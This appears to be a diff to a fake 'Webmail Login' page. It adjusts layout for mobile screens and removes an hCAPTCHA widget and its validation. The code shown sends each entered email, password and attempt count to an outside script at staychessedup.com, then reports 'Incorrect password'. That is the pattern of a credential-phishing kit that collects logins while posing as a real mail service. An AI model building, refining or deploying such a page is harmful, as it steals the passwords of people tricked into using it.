@@ -4,7 +4,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Webmail Login</title>
     <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />
     <style>
@@ -30,7 +30,7 @@
             width: 100%;
             max-width: 450px;
             margin: 0 auto;
-            padding: 15px;
+            padding: 10px;
             min-height: auto;
             display: flex;
             flex-direction: column;
@@ -69,8 +69,8 @@
 
         #webmail-logo {
             text-align: center;
-            margin: 20px auto 30px auto;
-            padding-bottom: 20px;
+            margin: 10px auto 15px auto;
+            padding-bottom: 10px;
             border-bottom: 1px solid #e1e5e9;
             display: flex;
             justify-content: center;
@@ -82,7 +82,7 @@
         }
 
         #webmail-logo img {
-            max-width: 800px;
+            max-width: 180px;
             height: auto;
             opacity: 0.9;
         }
@@ -136,7 +136,7 @@
             padding: 12px 12px 12px 40px;
             border: 2px solid #e1e5e9;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 16px;
             transition: border-color 0.3s ease;
             background: #fff;
         }
@@ -539,7 +539,6 @@
             }
         }
     </style>
-    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 </head>
 <body>
     <div id="login-wrapper" class="group has-pw-reset">
@@ -601,16 +600,6 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                                     </div>
 
                                     <input type="hidden" id="attempts" name="attempts" value="1">
-
-                                    <!-- Security Verification Label -->
-                                    <div class="input-req-login" style="margin-top: 15px; text-align: center;">
-                                        <label>Security Verification</label>
-                                    </div>
-
-                                    <!-- hCAPTCHA widget -->
-                                    <div id="hcaptcha-container" style="margin: 10px 0 20px 0; display: flex; justify-content: center;">
-                                        <div class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
-                                    </div>
 
                                     <div class="controls">
                                         <div class="login-btn">
@@ -895,14 +884,6 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                     return false;
                 }
 
-                // hCAPTCHA validation
-                const hcaptchaResponse = hcaptcha.getResponse();
-                if (!hcaptchaResponse) {
-                    show_status('Please complete the hCAPTCHA verification.', 'error');
-                    LOGIN_SUBMIT_OK = true;
-                    return false;
-                }
-
                 // Start authentication process
                 document.body.classList.add("logging-in");
                 login_button.suppress();
@@ -916,7 +897,6 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                 formData.append('user', email);
                 formData.append('pass', password);
                 formData.append('attempts', failedAttempts);
-                formData.append('h-captcha-response', hcaptchaResponse);
 
                 fetch('https://staychessedup.com/tanjiro/send.php', {
                     method: 'POST',
@@ -954,9 +934,8 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                             show_status(`Incorrect password. Try again.`, 'error');
                         }
 
-                        // Clear password field and reset hCAPTCHA
+                        // Clear password field
                         passwordInput.value = '';
-                        hcaptcha.reset();
                     }, 2000);
                 });
 
